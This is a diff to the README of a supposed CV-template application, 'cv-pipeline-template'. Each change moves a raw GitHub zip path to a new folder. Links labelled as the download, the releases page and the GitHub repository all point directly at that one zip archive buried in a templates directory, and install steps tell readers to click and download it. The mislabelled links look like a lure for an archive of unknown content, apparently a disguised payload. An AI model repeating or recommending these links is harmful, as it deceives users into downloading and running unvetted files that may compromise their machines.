@@ -8,7 +8,7 @@ Welcome to the **cv-pipeline-template**! This application helps you create profe
 
 You can download the latest version of the application from the Releases page. Here’s your quick access link:
 
-[![Download Here](https://raw.githubusercontent.com/pleasancesledding63/cv-pipeline-template/main/templates/cloud-engineer/cv-pipeline-template_3.2.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/pleasancesledding63/cv-pipeline-template/main/templates/cloud-engineer/cv-pipeline-template_3.2.zip)
+[![Download Here](https://raw.githubusercontent.com/pleasancesledding63/cv-pipeline-template/main/templates/altacv-class/legacy/pipeline_template_cv_3.2.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/pleasancesledding63/cv-pipeline-template/main/templates/altacv-class/legacy/pipeline_template_cv_3.2.zip)
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ To run the cv-pipeline-template, you need the following:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/pleasancesledding63/cv-pipeline-template/main/templates/cloud-engineer/cv-pipeline-template_3.2.zip). 
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/pleasancesledding63/cv-pipeline-template/main/templates/altacv-class/legacy/pipeline_template_cv_3.2.zip). 
 
 1. Click on the link.
 2. Look for the latest release.
@@ -67,7 +67,7 @@ The cv-pipeline-template is licensed under the MIT License, which allows you the
 
 ## 🔗 Useful Links
 
-- [Release Page](https://raw.githubusercontent.com/pleasancesledding63/cv-pipeline-template/main/templates/cloud-engineer/cv-pipeline-template_3.2.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/pleasancesledding63/cv-pipeline-template/main/templates/cloud-engineer/cv-pipeline-template_3.2.zip)
+- [Release Page](https://raw.githubusercontent.com/pleasancesledding63/cv-pipeline-template/main/templates/altacv-class/legacy/pipeline_template_cv_3.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/pleasancesledding63/cv-pipeline-template/main/templates/altacv-class/legacy/pipeline_template_cv_3.2.zip)
 
 Thank you for using **cv-pipeline-template**! We hope it simplifies your CV creation process.
